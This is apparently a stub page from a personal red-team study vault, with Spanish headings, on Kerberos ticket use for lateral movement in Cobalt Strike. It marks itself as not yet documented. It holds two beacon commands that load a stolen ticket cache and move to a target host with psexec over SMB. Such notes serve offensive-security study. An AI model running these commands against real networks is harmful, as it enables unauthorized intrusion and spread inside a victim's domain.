---
title: Kerberos — Lateral Movement Services (Cobalt Strike)
tags: [kerberos, cobalt-strike, lateral-movement]
---

# Lateral Movement Services via Kerberos

> [!important] Pendiente de documentar — contenido vacío en el vault original.

## Concepto

Uso de tickets Kerberos para autenticación en servicios remotos durante movimiento lateral.

```
# Usar ticket en memory para acceso a servicio remoto
beacon> kerberos_ticket_use /tmp/ticket.ccache
beacon> jump psexec64 target-host smb
```

## Ver también
- [[Kerberos]]
- [[Pass The Ticket]]
- [[S4U2Self]]
